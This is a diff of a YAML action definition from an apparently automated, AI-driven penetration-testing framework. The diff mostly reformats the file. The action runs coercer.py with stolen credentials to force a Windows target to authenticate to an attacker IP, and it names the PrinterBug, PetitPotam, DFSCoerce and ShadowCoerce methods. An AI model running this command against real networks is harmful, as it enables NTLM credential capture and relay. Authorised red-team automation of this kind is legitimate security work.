@@ -2,16 +2,20 @@ name: coerced_auth_methods
 category: services
 description: Comprehensive coerced authentication
 preconditions:
-  - os==windows
-  - has_cred
+- os==windows
+- has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "python3 coercer.py coerce -u '{username}' -p '{password}' -d {domain} -t {target_ip} -l {attacker_ip}"
+command_template: python3 coercer.py coerce -u '{username}' -p '{password}' -d {domain}
+  -t {target_ip} -l {attacker_ip}
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Coercer tests all known coercion methods: MS-RPRN (PrinterBug), MS-EFSRPC (PetitPotam), MS-DFSNM (DFSCoerce), MS-FSRVP (ShadowCoerce), MS-EVEN (coerce via eventlog)."
+mechanism: 'Coercer tests all known coercion methods: MS-RPRN (PrinterBug), MS-EFSRPC
+  (PetitPotam), MS-DFSNM (DFSCoerce), MS-FSRVP (ShadowCoerce), MS-EVEN (coerce via
+  eventlog).'
+hacktricks_ref: generic-hacking/tunneling-and-port-forwarding.md
